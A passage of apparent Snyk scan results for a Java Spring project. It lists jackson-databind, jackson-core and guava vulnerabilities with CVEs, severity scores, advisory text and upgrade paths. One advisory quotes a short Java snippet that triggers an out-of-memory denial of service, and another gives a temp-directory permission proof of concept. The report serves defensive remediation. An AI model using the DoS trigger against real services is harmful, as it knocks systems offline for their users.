deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Don’t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.3, 2.7.9.5, 2.8.11.3, 2.9.8 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/42912cac4753f3f718ece875e4d486f8264c2f2b)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2186)\n- [GitHub Release Tag](https://github.com/FasterXML/jackson/wiki/Jackson-Release-2.9.8)\n",
      "disclosureTime": "2019-01-02T19:18:44Z",
      "exploit": "Unproven",
      "fixedIn": [
        "2.6.7.3",
        "2.7.9.5",
        "2.8.11.3",
        "2.9.8"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.0.0, 2.9.8)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.0.0, 2.9.8)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-72882",
      "identifiers": {
        "CVE": [
          "CVE-2018-19362"
        ],
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-c8hm-7hpq-7jhg"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2021-07-06T14:09:16.312672Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2019-01-03T17:01:51Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/42912cac4753f3f718ece875e4d486f8264c2f2b"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2186"
        },
        {
          "title": "GitHub Release Tag",
          "url": "https://github.com/FasterXML/jackson/wiki/Jackson-Release-2.9.8"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.6.7.3)",
          "[2.7.0,2.7.9.5)",
          "[2.8.0,2.8.11.3)",
          "[2.9.0,2.9.8)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@1.5.18.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.8.11.3"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2019-01-03T14:17:23.673097Z",
      "credit": [
        "Wuguixiong"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. An attacker could perform a Remote Code Execution attacks due to not blocking the `axis2-transport-jms ` class from polymorphic deserialization.\r\n\r\n**Note** This vulnerability (`CVE-2018-19360`) is not identical to `CVE-2018-19362` and `CVE-2018-19361`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Don’t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.3, 2.7.9.5, 2.8.11.3, 2.9.8 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/42912cac4753f3f718ece875e4d486f8264c2f2b)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2186)\n- [GitHub Release Tag](https://github.com/FasterXML/jackson/wiki/Jackson-Release-2.9.8)\n",
      "disclosureTime": "2019-01-02T19:18:44Z",
      "exploit": "Unproven",
      "fixedIn": [
        "2.6.7.3",
        "2.7.9.5",
        "2.8.11.3",
        "2.9.8"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.0.0, 2.9.8)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.0.0, 2.9.8)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-72883",
      "identifiers": {
        "CVE": [
          "CVE-2018-19360"
        ],
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-f9hv-mg5h-xcw9"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2021-07-06T14:09:14.647729Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2019-01-03T17:01:51Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/42912cac4753f3f718ece875e4d486f8264c2f2b"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2186"
        },
        {
          "title": "GitHub Release Tag",
          "url": "https://github.com/FasterXML/jackson/wiki/Jackson-Release-2.9.8"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.6.7.3)",
          "[2.7.0,2.7.9.5)",
          "[2.8.0,2.8.11.3)",
          "[2.9.0,2.9.8)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@1.5.18.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.8.11.3"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2019-01-03T14:17:31.715185Z",
      "credit": [
        "Wuguixiong"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. An attacker could perform a Remote Code Execution attacks due to not blocking the `axis2-transport-jms ` class from polymorphic deserialization.\r\n\r\n**Note** This vulnerability (`CVE-2018-19361`) is not identical to `CVE-2018-19362` and `CVE-2018-19360`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Don’t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.3, 2.7.9.5, 2.8.11.3, 2.9.8 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/42912cac4753f3f718ece875e4d486f8264c2f2b)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2186)\n- [GitHub Release Tag](https://github.com/FasterXML/jackson/wiki/Jackson-Release-2.9.8)\n",
      "disclosureTime": "2019-01-02T19:18:43Z",
      "exploit": "Unproven",
      "fixedIn": [
        "2.6.7.3",
        "2.7.9.5",
        "2.8.11.3",
        "2.9.8"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.0.0, 2.9.8)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.0.0, 2.9.8)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-72884",
      "identifiers": {
        "CVE": [
          "CVE-2018-19361"
        ],
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-mx9v-gmh4-mgqw"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2021-07-06T14:09:13.761438Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2019-01-03T17:01:51Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/42912cac4753f3f718ece875e4d486f8264c2f2b"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2186"
        },
        {
          "title": "GitHub Release Tag",
          "url": "https://github.com/FasterXML/jackson/wiki/Jackson-Release-2.9.8"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.6.7.3)",
          "[2.7.0,2.7.9.5)",
          "[2.8.0,2.8.11.3)",
          "[2.9.0,2.9.8)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@1.5.18.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.8.11.3"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
      "alternativeIds": [],
      "creationTime": "2017-09-20T15:28:35.195000Z",
      "credit": [
        "Alessio Soldano"
      ],
      "cvssScore": 5.3,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-core](https://github.com/FasterXML/jackson-core) is a Core Jackson abstractions, basic JSON streaming API implementation\n\nAffected versions of this package are vulnerable to Denial of Service (DoS). If the REST endpoint consumes POST requests with JSON or XML data and data are invalid, the first unrecognized token is printed to server.log\r\n> If the first token is word of length 10MB, the whole word is printed. This is potentially dangerous and can be used to attack the server by filling the disk with logs.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\n\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\n\nTwo common types of DoS vulnerabilities:\n\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).\n\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)\n\n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-core` to version 2.8.6 or higher.\n## References\n- [GitHub PR](https://github.com/FasterXML/jackson-core/pull/322)\n- [Jira Issue](https://issues.jboss.org/browse/JBEAP-6316)\n",
      "disclosureTime": "2017-01-12T00:00:00Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "2.8.6"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ReaderBasedJsonParser",
            "filePath": "com/fasterxml/jackson/core/json/ReaderBasedJsonParser.java",
            "functionName": "_reportInvalidToken"
          },
          "version": [
            "[,2.8.6)"
          ]
        },
        {
          "functionId": {
            "className": "UTF8StreamJsonParser",
            "filePath": "com/fasterxml/jackson/core/json/UTF8StreamJsonParser.java",
            "functionName": "_reportInvalidToken"
          },
          "version": [
            "[,2.8.6)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.core.json.ReaderBasedJsonParser",
            "functionName": "_reportInvalidToken"
          },
          "version": [
            "[,2.8.6)"
          ]
        },
        {
          "functionId": {
            "className": "com.fasterxml.jackson.core.json.UTF8StreamJsonParser",
            "functionName": "_reportInvalidToken"
          },
          "version": [
            "[,2.8.6)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-31519",
      "identifiers": {
        "CVE": [],
        "CWE": [
          "CWE-399"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-core",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2020-12-14T14:41:28.857201Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-core",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-core",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2017-09-20T15:28:35Z",
      "references": [
        {
          "title": "GitHub PR",
          "url": "https://github.com/FasterXML/jackson-core/pull/322"
        },
        {
          "title": "Jira Issue",
          "url": "https://issues.jboss.org/browse/JBEAP-6316"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.8.6)"
        ]
      },
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Denial of Service (DoS)",
      "severityWithCritical": "medium",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4",
        "com.fasterxml.jackson.core:jackson-core@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@1.4.4.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.8.6",
        "com.fasterxml.jackson.core:jackson-core@2.8.6"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-core",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
      "alternativeIds": [],
      "creationTime": "2017-09-20T15:28:35.195000Z",
      "credit": [
        "gmethwin@github"
      ],
      "cvssScore": 5.3,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-core](https://github.com/FasterXML/jackson-core) is a Core Jackson abstractions, basic JSON streaming API implementation\n\nAffected versions of this package are vulnerable to Denial of Service (DoS). When `WRITE_BIGDECIMAL_AS_PLAIN` setting is enabled, Jackson will attempt to write out the whole number, no matter how large the exponent.\r\nThe following sample code will trigger an out of memory exception:\r\n```java\r\nObjectMapper mapper = new ObjectMapper().enable(JsonGenerator.Feature.WRITE_BIGDECIMAL_AS_PLAIN);\r\nmapper.writeValueAsString(new java.math.BigDecimal(\"9.223372E+1010671858\"));\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\n\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\n\nTwo common types of DoS vulnerabilities:\n\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).\n\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)\n\n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-core` to version 2.7.7 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-core/commit/96642978dcf1b69cba68ec72cb2f652d59a8b5be)\n- [GitHub Issue](https://github.com/FasterXML/jackson-core/issues/315)\n",
      "disclosureTime": "2016-08-25T00:00:00Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "2.7.7"
      ],
      "functions": [
        {
          "functionId": {
            "className": "UTF8JsonGenerator",
            "filePath": "com/fasterxml/jackson/core/json/UTF8JsonGenerator.java",
            "functionName": "writeNumber"
          },
          "version": [
            "[2.3.0-rc1,2.7.7)"
          ]
        },
        {
          "functionId": {
            "className": "WriterBasedJsonGenerator",
            "filePath": "com/fasterxml/jackson/core/json/WriterBasedJsonGenerator.java",
            "functionName": "writeNumber"
          },
          "version": [
            "[2.3.0-rc1,2.7.7)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.core.json.UTF8JsonGenerator",
            "functionName": "writeNumber"
          },
          "version": [
            "[2.3.0-rc1,2.7.7)"
          ]
        },
        {
          "functionId": {
            "className": "com.fasterxml.jackson.core.json.WriterBasedJsonGenerator",
            "functionName": "writeNumber"
          },
          "version": [
            "[2.3.0-rc1,2.7.7)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-31520",
      "identifiers": {
        "CVE": [],
        "CWE": [
          "CWE-399"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-core",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2020-12-14T14:40:54.842816Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-core",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-core",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2017-09-20T15:28:35Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-core/commit/96642978dcf1b69cba68ec72cb2f652d59a8b5be"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-core/issues/315"
        }
      ],
      "semver": {
        "vulnerable": [
          "[2.3.0-rc1,2.7.7)"
        ]
      },
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Denial of Service (DoS)",
      "severityWithCritical": "medium",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4",
        "com.fasterxml.jackson.core:jackson-core@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@1.4.0.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.8.1",
        "com.fasterxml.jackson.core:jackson-core@2.8.1"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-core",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N/E:P",
      "alternativeIds": [],
      "creationTime": "2020-10-02T14:16:13.342479Z",
      "credit": [
        "Jonathan Leitschuh"
      ],
      "cvssScore": 3.3,
      "description": "## Overview\n\n[com.google.guava:guava](https://github.com/google/guava) is a set of core libraries that includes new collection types (such as multimap and multiset,immutable collections, a graph library, functional types, an in-memory cache and more.\n\n\nAffected versions of this package are vulnerable to Information Disclosure.\nThe file permissions on the file created by `com.google.common.io.Files.createTempDir` allows an attacker running a malicious program co-resident on the same machine to steal secrets stored in this directory. This is because, by default, on unix-like operating systems the /tmp directory is shared between all users, so if the correct file permissions aren't set by the directory/file creator, the file becomes readable by all other users on that system.\r\n\r\n### PoC\r\n```\r\nFile guavaTempDir = com.google.common.io.Files.createTempDir();\r\nSystem.out.println(\"Guava Temp Dir: \" + guavaTempDir.getName());\r\nrunLS(guavaTempDir.getParentFile(), guavaTempDir); // Prints the file permissions -> drwxr-xr-x\r\nFile child = new File(guavaTempDir, \"guava-child.txt\");\r\nchild.createNewFile();\r\nrunLS(guavaTempDir, child); // Prints the file permissions -> -rw-r--r--\r\n```\r\n\r\nFor Android developers, it is recommend choosing a temporary directory API provided by Android, such as `context.getCacheDir()`. For other Java developers, we recommend migrating to the Java 7 API `java.nio.file.Files.createTempDirectory()` which explicitly configures permissions of 700, or configuring the Java runtime's java.io.tmpdir system property to point to a location whose permissions are appropriately configured.\n\n## Remediation\nThere is no fix for `com.google.guava:guava`. However, in version 30.0 and above, the vulnerable functionality has been deprecated. In oder to mitigate this vulnerability, upgrade for version 30.0 or higher and ensure your dependencies don't use the createTempFile or createTempFile methods.\n\n## References\n\n- [GHSA Advisory](https://github.com/advisories/GHSA-5mg8-w23w-74h3)\n\n- [GitHub Commit](https://github.com/google/guava/commit/fec0dbc4634006a6162cfd4d0d09c962073ddf40)\n\n- [GitHub Issue](https://github.com/google/guava/issues/4011)\n",
      "disclosureTime": "2020-10-02T04:56:54Z",
      "exploit": "Proof of Concept",
      "fixedIn": [
        "30.0-android",
        "30.0-jre"
      ],
      "functions": [
        {
          "functionId": {
            "className": "Files",
            "filePath": "com/google/common/io/Files.java",
            "functionName": "createTempDir"
          },
          "version": [
            "[,30.0)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.google.common.io.Files",
            "functionName": "createTempDir"
          },
          "version": [
            "[,30.0)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMGOOGLEGUAVA-1015415",
      "identifiers": {
        "CVE": [
          "CVE-2020-8908"
        ],
        "CWE": [
          "CWE-200"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "guava",
        "groupId": "com.google.guava"
      },
      "modificationTime": "2022-02-14T15:25:09.109843Z",
      "moduleName": "com.google.guava:guava",
      "packageManager": "maven",
      "packageName": "com.google.guava:guava",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-10-23T15:50:35Z",
      "references": [
        {
          "title": "GHSA Advisory",
          "url": "https://github.com/advisories/GHSA-5mg8-w23w-74h3"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/google/guava/commit/fec0dbc4634006a6162cfd4d0d09c962073ddf40"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/google/guava/issues/4011"
        }
      ],
      "semver": {
        "vulnerable": [
          "[, 30.0-android)",
          "(30.0-android, 30.0-jre)"
        ]
      },
      "severity": "low",
      "socialTrendAlert": false,
      "title": "Information Disclosure",
      "severityWithCritical": "low",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "io.springfox:springfox-swagger2@2.2.2",
        "com.google.guava:guava@18.0"
      ],
      "upgradePath": [
        false,
        "io.springfox:springfox-swagger2@2.10.0"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.google.guava:guava",
      "version": "18.0"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",
      "alternativeIds": [],
      "creationTime": "2018-04-25T07:28:15.755000Z",
      "credit": [
        "Apostolos Giannakidis"
      ],
      "cvssScore": 5.9,
      "description": "## Overview\n[com.google.guava:guava](https://github.com/google/guava) is a set of core libraries that includes new collection types (such as multimap and multiset,immutable collections, a graph library, functional types, an in-memory cache and more.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. During deserialization, two Guava classes accept a caller-specified size parameter and eagerly allocate an array of that size:\r\n* `AtomicDoubleArray` (when serialized with Java serialization)\r\n* `CompoundOrdering` (when serialized with GWT serialization)\r\n\r\nAn attacker may be able to send a specially crafted request which with then cause the server to allocate all it's memory, without validation whether the data size is reasonable.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)), is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, letting the attacker to control the state or the flow of the execution.\n\nJava deserialization issues have been known for years. However, interest in the issue intensified greatly in 2015, when classes that could be abused to achieve remote code execution were found in a [popular library (Apache Commons Collection)](https://snyk.io/vuln/SNYK-JAVA-COMMONSCOLLECTIONS-30078). These classes were used in zero-days affecting 